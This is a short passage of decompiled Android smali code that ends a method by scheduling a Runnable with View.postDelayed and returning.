    invoke-virtual {p1, v0, v1, v2}, Landroid/view/View;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void
.end method
